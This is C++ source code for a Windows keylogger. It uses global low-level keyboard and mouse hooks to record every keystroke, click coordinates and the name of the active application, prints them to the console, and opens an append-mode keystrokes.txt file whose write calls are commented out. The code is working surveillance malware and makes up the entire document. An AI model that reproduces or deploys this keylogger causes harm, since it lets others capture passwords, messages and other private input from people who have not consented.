#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
HHOOK keyboardHook;
HHOOK hCBTHook;
HHOOK mouseHook;                                                                               //cpy&paste buffer

std::ofstream outputFile("keystrokes.txt", std::ios::app);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


int main()
{
    // Set the event hook to monitor foreground window changes
    HWINEVENTHOOK hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);

    // Correct way to get module handle for the hook:
    HINSTANCE hInstance = GetModuleHandle(NULL); // Get handle to *this* module
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

    HINSTANCE hInstance_mouse = GetModuleHandle(NULL);
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInstance_mouse, 0);

    // Message loop to keep the application running and processing window event hooks
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    UnhookWinEvent(hook);
    UnhookWindowsHookEx(mouseHook);
    outputFile.close();

    return 0;
}

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if (event == EVENT_SYSTEM_FOREGROUND) 
    {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess) {
            char processName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, NULL, processName, MAX_PATH))
            {
                cout << endl << "===============["<< processName << "]===============" << endl;  // Store the keystroke in file
                //outputFile.flush();  // Flush to immediately write to the file
                // std::cout << "Active process: " << processName << std::endl;
            }
            CloseHandle(hProcess);
        }
    }
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
        int x = mouseStruct->pt.x;
        int y = mouseStruct->pt.y;

        switch (wParam)
        {
            case WM_LBUTTONDOWN:
                std::wcout << L"\n[Left click (" << x << L", " << y << L")]";
                //outputFile << L"\n[Left click (" << x << L", " << y << L")]";
                //outputFile.flush();
                break;
            case WM_RBUTTONDOWN:
                std::wcout << L"\n[Right click (" << x << L", " << y << L")]";
                //outputFile << L"\n[Right click (" << x << L", " << y << L")]";
                //outputFile.flush();
                break;
            // You can add cases for other mouse events like WM_MBUTTONDOWN (middle button) if needed.
        }
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        BYTE keyState[256];
        GetKeyboardState(keyState);
        WCHAR outputChar[2] = { 0 };

        switch (wParam) // Switch on wParam (message type)
        {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN: // Handle system key downs (Alt, etc.)
            {
                
                switch (keyInfo->vkCode)
                {
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        std::wcout << L"[Shift Pressed] ";
                        break;
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                        std::wcout << L"[Control] ";
                        break;
                    case VK_LMENU:
                    case VK_RMENU:
                        std::wcout << L"[Alt] ";
                        break;
                    case VK_CAPITAL:
                        std::wcout << L"[Caps Lock] ";
                        break;
                    case VK_BACK:
                        std::wcout << L"[Backspace] ";
                        break;
                    case VK_TAB:
                        std::wcout << L"[Tab] ";    
                        break;
                    case VK_ESCAPE:
                        std::wcout << L"[Escape] ";
                        break;
                    case VK_RETURN:
                        std::wcout << L"[Enter] ";
                        break;
                    case VK_SPACE:
                        std::wcout << L"[Space] "; 
                        break;
                    case VK_LEFT:
                        std::wcout << L"[<-] "; 
                        break;
                    case VK_RIGHT:
                        std::wcout << L"[->] ";
                        break;
                    case VK_UP:
                        std::wcout << L"[Up Arrow] ";
                        break;
                    case VK_DOWN:
                        std::wcout << L"[Down Arrow] ";
                        break;
                    case VK_DELETE:
                        std::wcout << L"[Del] ";
                        break;
                    case VK_INSERT:
                        std::wcout << L"[Ins] ";
                        break;
                    case VK_LWIN:
                    case VK_RWIN:
                        std::wcout << L"[Windows] ";
                        break;
                    case VK_NUMPAD0:
                        std::wcout << L"[NumPad 0] ";       
                        break;
                    case VK_NUMPAD1:
                        std::wcout << L"[NumPad 1] ";       
                        break;
                    case VK_NUMPAD2:
                        std::wcout << L"[NumPad 2] ";       
                        break;
                    case VK_NUMPAD3:
                        std::wcout << L"[NumPad 3] ";       
                        break;
                    case VK_NUMPAD4:
                        std::wcout << L"[NumPad 4] ";       
                        break;
                    case VK_NUMPAD5:
                        std::wcout << L"[NumPad 5] ";       
                        break;
                    case VK_NUMPAD6:
                        std::wcout << L"[NumPad 6] ";       
                        break;
                    case VK_NUMPAD7:
                        std::wcout << L"[NumPad 7] ";       
                        break;
                    case VK_NUMPAD8:
                        std::wcout << L"[NumPad 8] ";       
                        break;
                    case VK_NUMPAD9:
                        std::wcout << L"[NumPad 9] ";       
                        break;

                    case VK_MULTIPLY:
                        std::wcout << L"[NumPad Multiply] "; 
                        break;
                    case VK_ADD:
                        std::wcout << L"[NumPad Add] ";
                        break;
                    case VK_SEPARATOR:
                        std::wcout << L"[NumPad Separator] "; 
                        break;
                    case VK_SUBTRACT:
                        std::wcout << L"[NumPad Subtract] "; 
                        break;
                    case VK_DECIMAL:
                        std::wcout << L"[NumPad Decimal] ";
                        break;
                    case VK_DIVIDE:
                        std::wcout << L"[NumPad Divide] ";
                        break;
                    case VK_HOME:
                        std::wcout << L"[Home] ";
                        break;
                    case VK_END:
                        std::wcout << L"[End] ";
                        break;
                    case VK_PRIOR:
                        std::wcout << L"[Pg_up] ";
                        break;
                    case VK_NEXT:
                        std::wcout << L"[Pg_down] ";
                        break;
                    case VK_NUMLOCK:
                        std::wcout << L"[Numlock] ";
                        break;
                    case VK_SNAPSHOT:
                        std::wcout << L"[Print_scr] ";
                        break;
                    default:
                    {
                        int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
                        if (result == 1)
                            std::wcout << outputChar[0] << L" ";
                        else if (result > 1) { // Handle dead keys (like accents)
                            outputChar[result] = L'\0';
                            std::wcout << outputChar << L" ";
                        }
                        else
                            std::wcout << L"[unknown] ";
                        break;
                    }
                }
                break;
            }
            case WM_KEYUP:
            case WM_SYSKEYUP: // Handle system key ups
            {   
                switch (keyInfo->vkCode)
                {
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    {
                        std::wcout << L"[Shift Released] ";
                        break;
                    }
                }
                break;
            }
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

